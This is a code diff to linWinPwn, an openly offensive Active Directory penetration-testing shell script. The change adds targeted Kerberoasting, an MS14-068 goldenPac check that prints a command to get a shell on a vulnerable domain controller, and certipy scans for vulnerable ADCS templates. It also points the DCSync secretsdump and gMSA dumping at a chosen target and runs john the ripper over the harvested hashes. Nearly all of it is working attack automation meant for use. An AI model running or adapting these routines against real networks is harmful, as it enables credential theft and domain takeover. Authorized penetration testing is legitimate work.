@@ -35,6 +35,8 @@ impacket_GetNPUsers=$(which GetNPUsers.py)
 if [ ! -f "${impacket_GetNPUsers}" ]; then impacket_GetNPUsers=$(which impacket-GetNPUsers); fi
 impacket_getTGT=$(which getTGT.py)
 if [ ! -f "${impacket_getTGT}" ]; then impacket_getTGT=$(which impacket-getTGT); fi
+impacket_goldenPac=$(which goldenPac.py)
+if [ ! -f "${impacket_goldenPac}" ]; then impacket_goldenPac=$(which impacket-goldenPac); fi
 enum4linux_py=$(which enum4linux-ng)
 if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="${scripts_dir}/enum4linux-ng.py"; fi
 bloodhound=$(which bloodhound-python)
@@ -56,7 +58,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN} version 0.6.1
+      ${BLUE}linWinPwn: ${CYAN} version 0.6.2
       ${NC}https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -633,6 +635,8 @@ certipy_enum () {
             cd ${output_dir}/DomainRecon/ADCS
             ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp 2>/dev/null | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
             ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -scheme ldap | tee -a ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
+            ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -vulnerable -stdout | tee -a ${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt
+            ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -scheme ldap -vulnerable -stdout | tee -a ${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt
             cd ${current_dir}
         fi
     fi
@@ -776,6 +780,20 @@ kerberoast_attack () {
     echo -e ""
 }
 
+targetedkerberoast_attack () {
+    echo -e "${BLUE}[*] Targeted Kerberoasting Attack ${NC}"
+    if [ ! -f "${scripts_dir}/targetedKerberoast.py" ] ; then
+        echo -e "${RED}[-] Please verify the location of targetedKerberoast.py${NC}"
+    else
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] targetedKerberoast requires credentials${NC}"
+        else
+            ${scripts_dir}/targetedKerberoast.py -u ${user} -p ${password} -d ${domain} -D ${dc_domain} --dc-ip ${dc_ip} --only-abuse -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt | tee ${output_dir}/Kerberos/targetedkerberoast_output_${dc_domain}.txt 2>&1
+        fi
+    fi
+    echo -e ""
+}
+
 john_crack_asrep(){
     if [ ! -f "${john}" ] ; then
         echo -e "${RED}[-] Please verify the installation of john${NC}"
@@ -806,7 +824,7 @@ john_crack_kerberoast(){
             echo -e "${YELLOW}[i] Using $pass_list wordlist...${NC}"
             echo -e "${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}"
             echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
-            $john ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_list
+            $john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_list
             echo -e "${GREEN}[+] Printing cracked Kerberoast hashes...${NC}"
             $john ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show | tee ${output_dir}/Kerberos/kerberoast_john_results_${dc_domain}.txt
         fi
@@ -901,7 +919,7 @@ gmsa_dump () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
     else
-        ${crackmapexec} ldap ${dc_ip} "${argument_cme[@]}" --gmsa | > ${output_dir}/DomainRecon/cme_gMSA_${dc_domain}.txt
+        ${crackmapexec} ldap ${target} "${argument_cme[@]}" --gmsa | > ${output_dir}/DomainRecon/cme_gMSA_${dc_domain}.txt
     fi
     echo -e ""
 }
@@ -914,7 +932,7 @@ secrets_dump_dcsync () {
         if [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
         else
-            ${impacket_secretsdump} ${argument_imp}@${dc_ip} -just-dc | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
+            ${impacket_secretsdump} ${argument_imp}@${target} -just-dc | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -1159,6 +1177,20 @@ zerologon_check () {
     echo -e ""
 }
 
+ms14-068_check () {
+    echo -e "${BLUE}[*] ms14-068 check ${NC}"
+    if [ ! -f "${impacket_goldenPac}" ]; then
+        echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
+    else
+        ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} None -target-ip ${dc_ip} 2>/dev/null  | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>&1
+        if grep -q "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt; then
+            echo -e "${GREEN}[+] Domain controller vulnerable to ms14-068 found! Follow steps below for exploitation:${NC}"
+            echo -e "Get shell: ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
+        fi
+    fi
+    echo -e ""
+}
+
 ms17-010_check () {
     echo -e "${BLUE}[*] ms17-010 check ${NC}"
     if [ "${kerb_bool}" == true ]; then
@@ -1264,6 +1296,7 @@ kerberos () {
     asrep_attack
     asreprc4_attack
     kerberoast_attack
+    targetedkerberoast_attack
     john_crack_asrep
     john_crack_kerberoast
 }
@@ -1293,6 +1326,7 @@ vuln_checks () {
     nopac_check
     petitpotam_check
     zerologon_check
+    ms14-068_check
     ms17-010_check
     spooler_check
     webdav_check
@@ -1524,8 +1558,9 @@ kerberos_menu () {
     echo -e "3) AS REP Roasting Attack using GetNPUsers"
     echo -e "4) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
     echo -e "5) Kerberoast Attack using GetUserSPNs"
-    echo -e "6) Cracking AS REP Roast hashes using john the ripper"
-    echo -e "7) Cracking Kerberoast hashes using john the ripper"
+    echo -e "6) Targeted Kerberoast Attack"
+    echo -e "7) Cracking AS REP Roast hashes using john the ripper"
+    echo -e "8) Cracking Kerberoast hashes using john the ripper"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -1562,11 +1597,16 @@ kerberos_menu () {
         ;;
 
         6)
+        targetedkerberoast_attack
+        kerberos_menu
+        ;;
+
+        7)
         john_crack_asrep
         kerberos_menu
         ;;
         
-        7)
+        8)
         john_crack_kerberoast
         kerberos_menu
         ;;
@@ -1653,13 +1693,14 @@ vulns_menu () {
     echo -e "2) PetitPotam check using crackmapexec (only on DC)"
     echo -e "3) dfscoerce check using crackmapexec (only on DC)"
     echo -e "4) zerologon check using crackmapexec (only on DC)"
-    echo -e "5) MS17-010 check using crackmapexec"
-    echo -e "6) Print Spooler check using crackmapexec"
-    echo -e "7) WebDAV check using crackmapexec"
-    echo -e "8) shadowcoerce check using crackmapexec"
-    echo -e "9) SMB signing check using crackmapexec"
-    echo -e "10) ntlmv1 check using crackmapexec"
-    echo -e "11) runasppl check using crackmapexec"
+    echo -e "5) ms14-068 check (only on DC)"
+    echo -e "6) MS17-010 check using crackmapexec"
+    echo -e "7) Print Spooler check using crackmapexec"
+    echo -e "8) WebDAV check using crackmapexec"
+    echo -e "9) shadowcoerce check using crackmapexec"
+    echo -e "10) SMB signing check using crackmapexec"
+    echo -e "11) ntlmv1 check using crackmapexec"
+    echo -e "12) runasppl check using crackmapexec"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -1696,36 +1737,41 @@ vulns_menu () {
         ;;
 
         5)
+        ms14-068_check
+        vulns_menu
+        ;;
+        
+        6)
         ms17-010_check
         vulns_menu
         ;;
 
-        6)
+        7)
         spooler_check
         vulns_menu
         ;;
 
-        7)
+        8)
         webdav_check
         vulns_menu
         ;;
 
-        8)
+        9)
         shadowcoerce_check
         vulns_menu
         ;;
 
-        9)
+        10)
         smbsigning_check
         vulns_menu
         ;;
 
-        10)
+        11)
         ntlmv1_check
         vulns_menu
         ;;
 
-        11)
+        12)
         runasppl_check
         vulns_menu
         ;;
@@ -1873,6 +1919,7 @@ config_menu () {
         if [ ! -f "${impacket_secretsdump}" ] ; then echo -e "${RED}[-] impacket's secretsdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's secretsdump is installed${NC}"; fi
         if [ ! -f "${impacket_GetNPUsers}" ] ; then echo -e "${RED}[-] impacket's GetNPUsers is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetNPUsers is installed${NC}"; fi
         if [ ! -f "${impacket_getTGT}" ] ; then echo -e "${RED}[-] impacket's getTGT is not installed${NC}"; else echo -e "${GREEN}[+] impacket's getTGT is installed${NC}"; fi
+        if [ ! -f "${impacket_goldenPac}" ] ; then echo -e "${RED}[-] impacket's goldenPac is not installed${NC}"; else echo -e "${GREEN}[+] impacket's goldenPac is installed${NC}"; fi
         if [ ! -f "${bloodhound}" ] ; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
         if [ ! -f "${ldapdomaindump}" ] ; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
         if [ ! -f "${crackmapexec}" ] ; then echo -e "${RED}[-] crackmapexec is not installed${NC}"; else echo -e "${GREEN}[+] crackmapexec is installed${NC}"; fi
@@ -1888,6 +1935,8 @@ config_menu () {
         if [ ! -x "${enum4linux_py}" ] ; then echo -e "${RED}[-] enum4linux-ng is not executable${NC}"; else echo -e "${GREEN}[+] enum4linux-ng is executable${NC}"; fi
         if [ ! -f "${scripts_dir}/kerbrute" ] ; then echo -e "${RED}[-] kerbrute is not installed${NC}"; else echo -e "${GREEN}[+] kerbrute is installed${NC}"; fi
         if [ ! -x "${scripts_dir}/kerbrute" ] ; then echo -e "${RED}[-] kerbrute is not executable${NC}"; else echo -e "${GREEN}[+] kerbrute is executable${NC}"; fi
+        if [ ! -f "${scripts_dir}/targetedKerberoast.py" ] ; then echo -e "${RED}[-] targetedKerberoast is not installed${NC}"; else echo -e "${GREEN}[+] targetedKerberoast is installed${NC}"; fi
+        if [ ! -x "${scripts_dir}/targetedKerberoast.py" ] ; then echo -e "${RED}[-] targetedKerberoast is not executable${NC}"; else echo -e "${GREEN}[+] targetedKerberoast is executable${NC}"; fi
         if [ ! -f "${scripts_dir}/CVE-2022-33679.py" ] ; then echo -e "${RED}[-] CVE-2022-33679 is not installed${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is installed${NC}"; fi
         if [ ! -x "${scripts_dir}/CVE-2022-33679.py" ] ; then echo -e "${RED}[-] CVE-2022-33679 is not executable${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is executable${NC}"; fi
         if [ ! -f "${donpapi_dir}/DonPAPI.py" ] ; then echo -e "${RED}[-] DonPAPI is not installed${NC}"; else echo -e "${GREEN}[+] DonPAPI is installed${NC}"; fi
